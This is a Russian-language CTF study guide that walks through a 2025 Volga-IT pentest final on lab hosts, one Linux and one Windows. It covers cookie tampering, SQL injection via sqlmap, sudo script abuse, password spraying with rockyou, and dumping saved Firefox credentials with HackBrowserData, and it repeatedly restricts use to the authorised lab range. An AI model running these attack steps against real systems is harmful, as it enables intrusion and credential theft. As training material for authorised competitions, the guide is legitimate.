# VOLGA-IT · PENTEST FIELD GUIDE

**Финал 2025 — 28 маршрутов к флагам**  
`v1.0` · Телекоммуникации и информационная безопасность · Конспект для подготовки к следующему финалу

> [!IMPORTANT]
> **Основа документа — только PDF «Writeup по Volga-IT 2025», страницы 2–5.**  
> В нём указаны **19 флагов на Linux** и **9 на Windows**. Настоящие значения флагов в разборе скрыты как `flag{}`; формат флага по условию — `vit25{...}`.  
> **Команды с пометкой `[PDF]` приведены в исходнике** (исправлены только кавычки и опечатки CLI). **`[Практика]` — рабочие способы повторить описанный шаг; в самом PDF такой команды нет.** Имена неизвестных URL, скриптов и паролей не выдумываются.

**Разрешённая область именно финала 2025:** `10.73.73.1–10.73.73.100`. Все команды рассчитаны на учебный полигон с разрешением на тестирование; не запускайте перебор паролей или активное сканирование вне установленного диапазона.

---

## 0. Карта полигона

| Цель | Адрес | Выявленные сервисы | Маршрут |
|---|---|---|---|
| **Linux** | `10.73.73.13` | `22/tcp` SSH, `80/tcp` HTTP | Web → учётная запись `himmel` → `localadmin` → root |
| **Windows** | `10.73.73.37` | Основные: `22`, `445`, `5000`, `5985` | SMB → Python EXE/API → `Developer` → `Manager` → `ServiceUser` → `Administrator` |

### 0.1. Найти хосты

**[PDF]** В оригинале:

```bash
nmap -sP 10.73.73.1-100
```

**[Практика]** Актуальная запись того же discovery-сканирования:

```bash
nmap -sn 10.73.73.1-100
```

**Результат финала:** активные `10.73.73.13` и `10.73.73.37`. Отсутствие ответа на ping не всегда означает отсутствие хоста.

### 0.2. Проверить все порты

**[PDF]** Полное TCP-сканирование обоих обнаруженных серверов:

```bash
nmap -sC -sV -v -p- -oN NmapAllPort13 10.73.73.13
nmap -sC -sV -v -p- -oN nmap_all_port_37 10.73.73.37
```

| Ключ | Назначение |
|---|---|
| `-sC` | стандартные NSE-скрипты |
| `-sV` | определение версий сервисов |
| `-p-` | все 65 535 TCP-портов |
| `-v` | подробный вывод |
| `-oN <имя>` | сохранить результат в файл |

> [!TIP]
> На соревновании сначала **инвентаризация → проверка каждого сервиса → фиксирование флагов и полученных учётных данных**. Находка пароля часто открывает новую часть цепочки.

---

# 1. Linux `10.73.73.13`: 19 флагов

## 1.1. Web: `frieren.local` и `test.frieren.local` — L01–L10

### L01 · `/etc/hosts` — флаг при настройке доменного имени

**Найдено в PDF:** сайт на `10.73.73.13` открывался по имени `frieren.local`; при открытии `/etc/hosts` в окружении участника был **флаг № L01**.

**[Практика]** Проверка и добавление имени на Kali:

```bash
cat /etc/hosts
sudo nano /etc/hosts
```

Добавить, если записи нет:

```text
10.73.73.13 frieren.local test.frieren.local
```

Проверить:

```bash
getent hosts frieren.local
```

> Не путать: `/etc/hosts` **на Kali участника** и `/etc/hosts` **на удалённом Linux** — разные файлы. В исходнике упоминается обнаружение флага при открытии файла для настройки домена; на новом полигоне это не гарантировано.

### L02 · Исходный HTML главной страницы

**[Практика]** Проверить страницу и HTML-комментарии:

```bash
curl -sS http://frieren.local/ -o index.html
less index.html
```

**Флаг L02:** в исходном коде главной страницы (`View Page Source`, `Ctrl+U` в браузере).

### L03 · `/robots.txt` — флаг и скрытые маршруты

**[Практика]**

```bash
curl -sS http://frieren.local/robots.txt
```

**Флаг L03:** внутри `robots.txt`. Дополнительные находки:

```text
/robots.txt
/underground_dir/
/check_admin.php
```

**Действие:** открывать *каждый* указанный путь, а не ограничиваться обнаружением файла.

### L04 · `/underground_dir/` — подмена cookie

**Условие доступа из PDF:** `is_admin = True`.

**[Практика]**

```bash
curl -i http://frieren.local/underground_dir/
curl -i -H 'Cookie: is_admin=True' http://frieren.local/underground_dir/
```

**Флаг L04:** в защищённом каталоге после установки cookie. Страница `/check_admin.php` — дополнительная подсказка, не отдельный подтверждённый флаг.

### L05 · Поддомен `test.frieren.local`

**[PDF]** Поиск виртуальных хостов через Host header:

```bash
ffuf -w wordlist -ic -c -u 'http://frieren.local' -H 'Host: FUZZ.frieren.local'
```

`wordlist` — **заглушка из PDF**: подставить существующий словарь со словами для субдоменов. В результате обнаружен `test.frieren.local`.

**[Практика]** Убедиться, что имя разрешается через `/etc/hosts`, и открыть:

```bash
curl -sS http://test.frieren.local/
```

**Флаг L05:** главная страница поддомена.

### L06 · `topsecret.bak` — резервная копия

**[PDF → исправлен шаблон URL]** В PDF для `ffuf` указан параметр `-e`, но пропущен обязательный для перебора файлов маркер `FUZZ` в URL. Рабочая команда:

```bash
ffuf -w wordlist -ic -c \
  -u 'http://test.frieren.local/FUZZ' \
  -e '.bak,.txt,.docs,.pdf'
```

**[Практика]** Прочитать найденный файл:

```bash
curl -sS http://test.frieren.local/topsecret.bak
```

**Флаг L06:** содержимое `/topsecret.bak` на поддомене. Расширение `.docs` сохранено *как в PDF*.

### L07 · Метаданные изображения (EXIF)

**[PDF]** Скачать картинку со страницы `test.frieren.local`, затем:

```bash
exiftool image_name.jpg
```

`image_name.jpg` — условное имя из исходника. **Флаг L07:** поле описания/метаданные JPEG, не обязательно текст на изображении.

### L08 · Подключённый JavaScript

**Найдено в PDF:** код главной страницы содержит ссылку на JS-файл. В самом JS лежат **флаг L08 и логин/пароль**.

**[Практика]** Найти ссылку в скачанном HTML:

```bash
grep -nEi '<script|\.js' index.html
```

Открыть конкретный URL скрипта в браузере или через `curl`. **Точное имя JS-файла в PDF не приведено.**

**Следующий шаг:** полученную пару логин/пароль использовать для входа в личный кабинет.

### L09 · IDOR: сообщение № 74

**Найдено в PDF:** после входа в личный кабинет можно просмотреть **чужое сообщение с ID `74`**; внутри — **флаг L09**.

**Что проверять:** идентификатор сообщения в URL, GET/POST-параметрах и запросах из DevTools/Burp Suite. Изменить только идентификатор на `74` и повторить запрос в своей тестовой сессии.

**Точный endpoint/HTTP-метод в источнике не указаны**; выражение `?msg=74` нельзя считать подтверждённым URL без анализа реального запроса.

### L10 · SQL-инъекция в параметре `msg`

**Найдено в PDF:** параметр `msg` уязвим к SQL injection. Через него получены **флаг L10** и **SSH-учётные данные `himmel`**.

**[Практика]** После определения настоящего URL сообщения можно проверять *именно параметр* `msg`:

```bash
# Пример-шаблон, НЕ команда из PDF.
# Заменить <PATH> на адрес из реально перехваченного запроса.
sqlmap -u 'http://frieren.local/<PATH>?msg=1' -p msg --batch --dbs
```

При необходимости передать авторизованную cookie командой `--cookie='имя=значение'`. **PDF не сообщает конкретные payload, таблицы, endpoint и способ выгрузки** — не считайте их установленными фактами.

**Переход по цепочке:** вход по SSH в `himmel`.

---

## 1.2. Linux shell: `himmel` → `localadmin` → root — L11–L19

### Вход в `himmel`

**[Практика]** Использовать найденные в SQLi учётные данные:

```bash
ssh himmel@10.73.73.13
```

### L11 · Скрытый файл `.flag` в домашнем каталоге

**[Практика]**

```bash
whoami
pwd
ls -la ~
cat ~/.flag
```

**Флаг L11:** `/home/himmel/.flag` (домашняя папка `himmel`).

### L12 · `/etc/passwd`

**[PDF]**

```bash
cat /etc/passwd
```

**Флаг L12:** непосредственно в содержимом файла учётных записей.

### L13 · `/etc/group`

**[PDF]**

```bash
cat /etc/group
```

**Флаг L13:** в файле групп.

### L14 · Информация о ядре

**[PDF]**

```bash
uname -a
```

**Флаг L14:** присутствует в выводе команды.

### L15 · Переменные окружения

**[PDF]**

```bash
printenv
```

**Флаг L15:** содержится в одной из переменных окружения.

### L16 · Фоновая задача, обнаруженная через `pspy64`

**[PDF]** Инструмент: `pspy64` — мониторинг запуска процессов без root-доступа.

**[Практика]** Если бинарник уже находится на стенде:

```bash
chmod +x ./pspy64
./pspy64
```

**Что произошло на финале:** каждую минуту запускался скрипт. В нём/его выполнении обнаружены **флаг L16 и пароль учётной записи `localadmin`**.

**Обязательный порядок:** сначала найти **реальный путь скрипта** в выводе `pspy64`, затем изучить его. **Имя и путь этого скрипта в PDF отсутствуют.**

### Переключение в `localadmin`

**[PDF]** Для `localadmin` прямое SSH-подключение было запрещено; использован локальный `su`.

**[Практика]** Из shell `himmel`:

```bash
su - localadmin
whoami
ls -la ~
```

### L17 · `hacker_in_the_club.pcap` — ICMP Data → ASCII

**Находка:** в домашней директории `localadmin` лежит `hacker_in_the_club.pcap`. Флаг спрятан в полях **Data ICMP Echo Request**.

**[Практика]** Найти PCAP и извлечь hex-полезную нагрузку:

```bash
ls -la ~
tshark -r hacker_in_the_club.pcap -Y 'icmp.type == 8' \
  -T fields -e data.data
```

Если в `data.data` представлены hex-байты сообщения, вывести их как ASCII:

```bash
tshark -r hacker_in_the_club.pcap -Y 'icmp.type == 8' \
  -T fields -e data.data | tr -d ':' | xxd -r -p
```

**Флаг L17:** восстановленное сообщение. **В PDF сказано, что автор писал отдельный скрипт, но его код не опубликован**; пример с `tshark` — эквивалентная учебная реализация.

### L18 · История команд `.bash_history`

**[PDF → команда восстановления]**

```bash
cat ~/.bash_history
```

**Флаг L18:** в истории команд пользователя `localadmin`.

### L19 · `sudo -l` → `welcome.sh` → root

**[PDF]** Проверка разрешённых sudo-команд:

```bash
sudo -l
```

Обнаруженное правило:

```text
(root) NOPASSWD: /usr/local/bin/welcome.sh
```

**[Практика]** Посмотреть логику скрипта:

```bash
ls -l /usr/local/bin/welcome.sh
cat /usr/local/bin/welcome.sh
sudo /usr/local/bin/welcome.sh
```

**Конкретная особенность финала:** при появлении надписи в выполняемом скрипте нажатие **`Ctrl+C`** приводило к **root shell**. Это уязвимость *конкретного сценария*, а не универсальный способ обхода `sudo`.

**[Практика]** В появившемся root shell:

```bash
id
cat /root/sec_flag
```

**Флаг L19:** `/root/sec_flag` — последний Linux-флаг.

---

# 2. Windows `10.73.73.37`: 9 флагов

## 2.1. SMB → `client.exe` → API — W01–W02

### W01 · SMB-шара `garbage` → `notes.txt`

**[PDF]** Два способа проверить доступ без известного пароля (в исходнике неудачно отформатированы длинные дефисы):

```bash
nxc smb 10.73.73.37 -u 'a' -p '' --shares
smbmap -u 'a' -p '' -H 10.73.73.37
```

Найдена доступная шара `garbage`.

**[PDF]**

```bash
smbclient -N //10.73.73.37/garbage
```

В интерактивном приглашении `smb: \\>`:

```text
ls
get notes.txt
get client.exe
exit
```

На Kali:

```bash
cat notes.txt
```

**Флаг W01:** текст файла `notes.txt`. **`client.exe`** запускает следующую цепочку.

### W02 · PyInstaller EXE → Python-код → JSON API `:5000`

**[PDF]** Подозрительный EXE оказался упакованной Python-программой. Для первичного анализа:

```bash
strings client.exe
```

**[PDF]** Извлечение `pyc` из PyInstaller:

```bash
python ./pyinstxtractor/pyinstxtractor.py client.exe
```

**[Практика]** Найти извлечённый файл (фактическая папка зависит от распаковщика):

```bash
find . -name '*.pyc' -type f
```

**[PDF]** Декомпиляция найденного `client.pyc`:

```bash
./pycdc client.pyc > decClient.py
```

**Разобрать в `decClient.py`:** URL/endpoint, метод запроса, имена JSON-полей и способ получения правильных значений.

**Что доказано PDF:** приложение отправляет JSON на сервер `10.73.73.37:5000`; при правильных значениях сервер отдаёт **флаг W02**. Если передать этот флаг обратно через приложение, сервис выдаёт логин **`Developer`** и его пароль.

> [!NOTE]
> **PDF не содержит точные JSON-поля, URL, метод HTTP и значения.** Не подменяйте их вымышленным «готовым запросом» — сначала декомпилируйте `client.exe`.

## 2.2. `Developer`: файлы, пользователи, сеть — W03–W05

### Вход в `Developer`

**[Практика]**

```bash
ssh Developer@10.73.73.37
```

### W03 · Скрытый `info.txt` в `Documents`

**[PDF]** Для `cmd.exe`:

```cmd
cd C:\Users\Developer\Documents
dir /ah
type info.txt
```

**[Практика]** Если shell открыт в PowerShell (синтаксис `dir /ah` там не подходит):

```powershell
Get-ChildItem -Force 'C:\Users\Developer\Documents'
Get-Content 'C:\Users\Developer\Documents\info.txt'
```

**Флаг W03:** скрытый `C:\Users\Developer\Documents\info.txt`.

### W04 · Описание пользователя `Manager`

**[PDF]**

```cmd
net user
```

**[Практика]** Прочитать сведения именно о `Manager`:

```cmd
net user Manager
```

**Флаг W04:** поле **описания** пользователя `Manager`.

### W05 · `ipconfig`

**[PDF]**

```cmd
ipconfig
```

**Флаг W05:** вывод сетевой конфигурации.

## 2.3. `Manager`: PowerShell и Firefox — W06–W07

### Получить доступ к `Manager`

**[PDF]** В финале проверяли пароль `Manager` по словарю:

```bash
nxc smb 10.73.73.37 -u 'Manager' -p /usr/share/wordlists/rockyou.txt
```

**[Практика]** При найденном пароле:

```bash
evil-winrm -i 10.73.73.37 -u 'Manager' -p '<PASSWORD>'
```

В PDF указаны варианты `evil-winrm` и SSH. Перебор использовать **только на учебном полигоне с разрешением**.

### W06 · PowerShell PSReadLine history

**[PDF]** Искомый файл:

```text
%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

**[Практика, PowerShell]**

```powershell
Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
```

**[Практика, cmd.exe]**

```cmd
type "%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
```

**Флаг W06:** в истории команд. Дополнительный факт из исходника: в истории упоминалось, что `Documents` пользователя `Manager` исключён из проверки антивирусом; на рабочем столе есть `FireFox.lnk`.

### W07 · Firefox: сохранённый пароль и cookie

**[PDF]** Использован инструмент `HackBrowserData` (ссылка из исходника: <https://github.com/moonD4rk/HackBrowserData>):

```powershell
.\hack-browser-data.exe -b all -f json --dir results --zip
```

**Что получилось:**

- **Флаг W07** — в cookie Firefox.
- **Пароль** — в сохранённых учётных данных Firefox; он использовался на следующем этапе проверки известных пользователей.

Проверяйте JSON-вывод по двум категориям отдельно: **cookies** и **passwords**. Примечание в PDF про исключение `Documents` — наблюдение о стенде 2025 года, а не универсальное условие этой проверки.

## 2.4. `ServiceUser` → корзина → `Administrator` — W08–W09

### Найти учётную запись `ServiceUser`

**[PDF]** Проверка **одного уже найденного пароля** на списке известных пользователей:

```bash
nxc smb 10.73.73.37 -u users.txt -p '<FOUND_PASSWORD>' --continue-on-success
```

`users.txt` — подготовленный список имён из перечисления Windows; `'<FOUND_PASSWORD>'` заменяется фактически найденным паролем. В финале так обнаружили доступ к `ServiceUser`.

**[Практика]**

```bash
evil-winrm -i 10.73.73.37 -u 'ServiceUser' -p '<FOUND_PASSWORD>'
```

### W08 · `C:\$Recycle.Bin\<SID>\flag.txt`

**[PDF]** Определение SID пользователя:

```powershell
Get-LocalUser -Name 'ServiceUser' | Select-Object Name, SID
```

**[Практика]** Подставить реальный SID из вывода (не строку `<SID>`):

```powershell
Get-ChildItem -Force -LiteralPath 'C:\$Recycle.Bin\<SID>'
Get-Content -LiteralPath 'C:\$Recycle.Bin\<SID>\flag.txt'
```

> [!WARNING]
> В PowerShell путь `C:\$Recycle.Bin\...` берите в **одинарные кавычки**: в двойных `$Recycle` воспринимается как переменная.

**Флаг W08:** файл `flag.txt` в корзине. Там же обнаружен файл с **учётными данными `Administrator`**. Его точное имя в PDF не приведено.

### W09 · `Administrator` → `Desktop\root.txt` → Caesar

**[Практика]**

```bash
ssh Administrator@10.73.73.37
```

**[Практика, cmd.exe]**

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

**Что известно из PDF:** в `root.txt` лежит **зашифрованный шифром Цезаря флаг W09**, а не текст в готовом виде. Сдвиг в исходнике не указан.

**[Практика]** Если под рукой нет декодера, перебрать 26 сдвигов английского алфавита:

```python
text = input('Ciphertext: ')
for shift in range(26):
    out = []
    for c in text:
        if 'A' <= c <= 'Z':
            out.append(chr((ord(c) - 65 - shift) % 26 + 65))
        elif 'a' <= c <= 'z':
            out.append(chr((ord(c) - 97 - shift) % 26 + 97))
        else:
            out.append(c)
    print(f'{shift:2d}: {"".join(out)}')
```

**Флаг W09:** результат расшифровки `root.txt`. Это последний Windows-флаг из врайтапа.

---

# 3. Реестр мест, давших флаги

**Здесь только подтверждённые находки из PDF 2025.** Таблица — чек-лист, а не список всех теоретически возможных уязвимостей.

### 3.1. Linux: 19/19

| ID | Что проверить | Команда / действие | Результат в 2025 |
|:--:|---|---|---|
| L01 | `/etc/hosts` | `cat /etc/hosts` | Флаг при настройке `frieren.local` |
| L02 | HTML главной | `curl http://frieren.local/` | Флаг в исходнике |
| L03 | `/robots.txt` | `curl http://frieren.local/robots.txt` | Флаг, `/underground_dir/`, `check_admin.php` |
| L04 | `/underground_dir/` | Cookie `is_admin=True` | Флаг в закрытом каталоге |
| L05 | `test.frieren.local` | `ffuf` с `Host: FUZZ.frieren.local` | Флаг на поддомене |
| L06 | `topsecret.bak` | `ffuf -e .bak,...` | Флаг в backup-файле |
| L07 | JPEG на поддомене | `exiftool image_name.jpg` | Флаг в метаданных |
| L08 | JS основной страницы | Открыть подключённый `.js` | Флаг + логин/пароль |
| L09 | Личный кабинет / IDOR | Сообщение `74` | Флаг в чужом сообщении |
| L10 | Параметр `msg` | SQLi | Флаг + SSH-доступ `himmel` |
| L11 | `/home/himmel/.flag` | `ls -la ~; cat ~/.flag` | Скрытый флаг |
| L12 | `/etc/passwd` | `cat /etc/passwd` | Флаг в содержимом |
| L13 | `/etc/group` | `cat /etc/group` | Флаг в содержимом |
| L14 | Данные ядра | `uname -a` | Флаг в выводе |
| L15 | Окружение | `printenv` | Флаг в переменных |
| L16 | Периодический скрипт | `pspy64` | Флаг + доступ `localadmin` |
| L17 | `hacker_in_the_club.pcap` | ICMP Data → ASCII | Флаг из трафика |
| L18 | `~/.bash_history` | `cat ~/.bash_history` | Флаг в истории |
| L19 | `/root/sec_flag` | `sudo -l` → `welcome.sh` → root | Последний Linux-флаг |

### 3.2. Windows: 9/9

| ID | Что проверить | Команда / действие | Результат в 2025 |
|:--:|---|---|---|
| W01 | `\\10.73.73.37\garbage\notes.txt` | `smbclient -N`, `get notes.txt` | Флаг в SMB-шаре |
| W02 | `client.exe` и API `:5000` | `pyinstxtractor` → `pycdc` → JSON | Флаг + `Developer` credentials |
| W03 | `Developer\Documents\info.txt` | `dir /ah`, `type info.txt` | Флаг в скрытом файле |
| W04 | Описание `Manager` | `net user Manager` | Флаг в описании |
| W05 | Сеть Windows | `ipconfig` | Флаг в выводе |
| W06 | `ConsoleHost_history.txt` | `Get-Content`, `type` | Флаг в PSReadLine |
| W07 | Firefox cookie | `hack-browser-data.exe` | Флаг в cookie + сохранённый пароль |
| W08 | `$Recycle.Bin\<SID>\flag.txt` | `Get-LocalUser` → `Get-Content` | Флаг + `Administrator` credentials |
| W09 | `Administrator\Desktop\root.txt` | `type` → Caesar decode | Последний флаг |

---

# 4. Маршруты развития доступа

**Linux**

```text
10.73.73.13:80
  ├─ /etc/hosts, HTML, /robots.txt, /underground_dir/ + is_admin=True
  ├─ Host fuzz → test.frieren.local → topsecret.bak / EXIF
  └─ JS → логин/пароль → личный кабинет
                 ├─ IDOR → message 74
                 └─ SQLi в msg → SSH credentials
                                     ↓
                               ssh: himmel
                                     ├─ .flag, passwd, group, uname, printenv
                                     └─ pspy64 → периодический скрипт → localadmin
                                                                ↓
                                           su → PCAP/ICMP → .bash_history
                                                                ↓
                                     sudo -l → welcome.sh → root → sec_flag
```

**Windows**

```text
10.73.73.37:445 SMB → garbage/notes.txt + client.exe
                                      ↓
                            PyInstaller → pyc → Python
                                      ↓
                          JSON API :5000 → flag + Developer
                                      ↓
                          Developer: info.txt / net user / ipconfig
                                      ↓
                        Manager: словарь → PSReadLine / Firefox
                                      ↓
                           пароль → проверка users.txt
                                      ↓
                              ServiceUser → Recycle Bin
                                      ↓
                         Administrator → root.txt → Caesar
```

---

# 5. Карманный чек-лист перед сдачей

**Проверки, которые действительно привели к флагам в 2025 году:**

- [ ] `nmap` по разрешённым адресам и всем TCP-портам обнаруженных хостов.
- [ ] `/etc/hosts`, HTML страницы, `/robots.txt` и перечисленные в нём маршруты.
- [ ] Подозрительные cookies, включая серверные проверки `is_admin`.
- [ ] Virtual hosts/subdomains (`ffuf`, заголовок `Host`) и файлы с расширениями `.bak`, `.txt`, `.docs`, `.pdf`.
- [ ] Метаданные изображений (`exiftool`) и подключённые `.js` (секреты в клиентском коде).
- [ ] IDOR по идентификаторам сообщений; инъекция в `msg` (в рамках разрешённой цели).
- [ ] После SSH: `ls -la ~`, `/etc/passwd`, `/etc/group`, `uname -a`, `printenv`.
- [ ] Фоновые процессы (`pspy64`), другие пользователи (`su`), `.bash_history`, PCAP + ICMP Data.
- [ ] `sudo -l`, анализ разрешённых root-скриптов, `/root/sec_flag`.
- [ ] SMB-шары: пустой пароль/гостевой доступ, `notes.txt`, исполняемые файлы.
- [ ] Python EXE: `strings`, PyInstaller, `pycdc`, восстановление логики JSON API.
- [ ] Windows: `dir /ah`, `net user`, описание конкретного пользователя, `ipconfig`.
- [ ] PowerShell PSReadLine, Firefox saved passwords и cookies.
- [ ] Полученные пароли → другие известные учётные записи; SID → `$Recycle.Bin`.
- [ ] Файлы на рабочем столе Administrator и простые шифры (в 2025 — Caesar).

> [!CAUTION]
> **Ни одно из следующих действий не требуется для зачёта находок:** удаление чужих флагов, изменение данных других участников, атака на адреса вне `10.73.73.1–100`. В правилах финала 2025 за препятствование другим участникам была предусмотрена дисквалификация.

---

## Что в исходнике НЕ указано

Чтобы учебник оставался точным, **не следует выдавать за факты**: реальные значения 28 флагов; реальные логины и пароли (кроме названий пользователей); полный URL сообщения `74` и точный SQLi payload; имя файла JavaScript; путь ежеминутного Linux-скрипта; структуру API `:5000` и поля JSON; конкретный сдвиг Цезаря; точное имя файла с паролем Administrator в корзине. Любая команда с такими элементами в этом справочнике — **пример восстановления**, а не дословный лог участника.

**Источник:** «Writeup по Volga-IT 2025.pdf», стр. 2 (правила и границы), стр. 3–4 (Linux), стр. 4–5 (Windows). **Другие годы и дополнительные неподтверждённые пути здесь намеренно не добавлены.**
